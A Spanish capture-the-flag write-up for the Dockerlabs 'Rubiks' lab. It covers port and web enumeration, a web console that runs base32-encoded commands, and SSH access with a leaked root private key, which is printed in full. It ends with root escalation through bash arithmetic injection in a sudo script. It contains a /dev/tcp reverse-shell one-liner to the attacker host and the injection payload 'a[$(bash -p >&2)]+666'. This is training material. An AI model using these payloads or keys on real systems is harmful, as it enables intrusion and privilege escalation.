
# Writeup Template: Maquina `[ Rubiks ]`

- Tags: #Rubiks
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Rubiks](https://mega.nz/file/mEcS3DJT#9gcjtWbWlZcFg7chYKcKwzo6gsa7HYJAmDbluJ_AbI8)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x Rubiks.zip
sudo bash auto_deploy.sh rubiks.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((ubuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
Tenemos **hostDiscovery** asi que agreagaremos la siguiente linea a nuestro archivo: **( /etc/passwd )**
```bash
172.17.0.2 rubikcube.dl
```

direccion **URL** del servicio:
```bash
http://rubikcube.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://rubikcube.dl/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 rubikcube.dl # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://rubikcube.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/img/                 (Status: 200) [Size: 3545]
/administration/      (Status: 200) [Size: 5460]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://rubikcube.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,pl
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 4327]
/about.php            (Status: 200) [Size: 4181]
/faq.php              (Status: 200) [Size: 7817]
/img                  (Status: 301) [Size: 310] [--> http://rubikcube.dl/img/]
/administration       (Status: 301) [Size: 321] [--> http://rubikcube.dl/administration/]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.rubikcube.dl" -u 172.17.0.2 --hl=9
```

- **Hallazgos**:
```bash
000002618:   200        120 L    270 W      5447 Ch     "administration"
```

Tenemo la siguiente ruta que es un panel administrativo:
Aquí puedes ver un resumen de la actividad reciente, notificaciones y datos importantes para la administración del sitio.
```bash
http://rubikcube.dl/administration/
```

Realizando fuzzing de archivos en esa ruta:
```bash
gobuster dir -u http://rubikcube.dl/administration/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,pl
```

Tenemos lo siguientes resultados
```bash
/index.php            (Status: 200) [Size: 5460]
/img                  (Status: 301) [Size: 325] [--> http://rubikcube.dl/administration/img/]
/configuration.php    (Status: 200) [Size: 6665]
```

Tenemos el panel de configuracion:
```bash
http://rubikcube.dl/administration/configuration.php
```
### Credenciales Encontradas
En el panel de administracion solo hemos encontrado por ahora dos nombres de usuarios:
```bash
tluisillo
maria
```

Ahora sabiendo que tenemos un subdominio procedemos a agregarlo a nuestro archivo: **( /etc/passwd )** para ver que podemos encontrar:
```bash
http://administration.rubikcube.dl/
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que si nos carga la el siguiente subdominio:
```bash
http://rubikcube.dl/administration/index.php
```
### Ejecucion del Ataque
Vemos que tiene una seccion **console** que si ingresamos a ella vemos que podemos ejecutar comandos:
```bash
http://administration.rubikcube.dl/myconsole.php
```

Tenemos este comentario en el codigo **HTML**
```bash
<!-- Formulario para enviar comandos codificados en ??? -->
```

Despues de probar todos estas codificaciones que no funcionan:
```bash
echo -n "whoami" | base64
echo "whoami" | md5sum
echo "whoami" | sha256sum
echo "whoami" | xxd -p
```

Tenemos uno que si funciono
```bash
# Comandos para explotación
echo -n "whoami" | base32

O5UG6YLNNE====== # Este colocamos
```

### Intrusion
Nos ponemos en modo escucha para ver si podemos ganar acceso
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
echo -n "bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'" | base32

MJQXGZJVOJRGC5DINRWGS3DJNZVGR2TIRKFMRSVMU3GGQ3DJU3GGQ2DJNZVGR2TIRKFMRSV # comando final
```

Aunque el comando esta bien, Existe validacion para que no puedamos ganar acceso asi que veremos is podemos enumerar el sistema desde el sistio
```bash
echo -n "ls -la" | base32

NRZSALLMME======
```

Tenemos lo siguiente:
```bash
#### Salida del Comando:

total 40
drwxr-xr-x 3 root root 4096 Aug 30  2024 .
drwxr-xr-x 4 root root 4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 3389 Aug 30  2024 .id_rsa
-rw-r--r-- 1 root root 6665 Aug 30  2024 configuration.php
drwxr-xr-x 2 root root 4096 Aug 30  2024 img
-rw-r--r-- 1 root root 5460 Aug 30  2024 index.php
-rw-r--r-- 1 root root 3509 Aug 30  2024 myconsole.php
-rw-r--r-- 1 root root 1825 Aug 30  2024 styles.css
```

Tenemos una llave que pertenece a **root**
```bash
.id_rsa
```

Ahora listamos su contenido:
```bash
echo -n "cat .id_rsa" | base32

MNQXIIBONFSF64TTME====== # Comando
```

Ya que podemos ver el contido no necesitamos descargarlo, Lo copiamos directamente y lo usaremos con llave **id_rsa** para estos posibles usuarios:
```bash
luisillo
maria
root
```

archivo en nuestra maquina atacanate: **id_rsa**
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Una ves la llave guardada en nuestro sistema, Procedmeos a darle permisos:
```bash
chmod 600 id_rsa
```

Hemos ganado acceso como este usuario: **lusiillo**
```bash
ssh-keygen -R 172.17.0.2 && ssh -i id_rsa luisillo@172.17.0.2
```

---
## Escalada de Privilegios

### Explotacion de Privilegios
###### Usuario `[ Nombre-Usuario ]`:
Enumerando los permisos del usuario tenemos lo siguiente:
```bash
User luisillo may run the following commands on 8baec253c6e8:
    (ALL) NOPASSWD: /bin/cube
```

Revisando el codigo fuente es un script de bash:
```bash
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
```

Ahora podemos explotarlo de la siguiete manera:
```bash
a[$(whoami >&2)]+666
```

1. **Estructura base:**
    - Parece una expresión matemática (ej. `array[index] + valor`)
    - `a[]`: Se interpreta como un _array_ en algunos lenguajes
    - `+666`: Suma numérica
2. **Inyección de comando:**
    - `$(whoami >&2)`: Esto es lo crítico
        - `$( )`: Ejecuta un comando en un _subshell_ y sustituye su salida
        - `whoami`: Comando que devuelve el usuario actual
        - `>&2`: Redirige la salida al _error estándar_ (stderr)

Ahora nos aprovechamos de esto para lanzar una bash como **root**
```bash
# Comando para escalar al usuario: ( root )
a[$(bash -p >&2)]+666
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@8baec253c6e8:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a ejecutar comandos desde una web
2. Aprendimos a obtener la llave **id_rsa** para ganar acceso por ssh

## Recomendaciones de Seguridad
- No confiar en el input del usuario.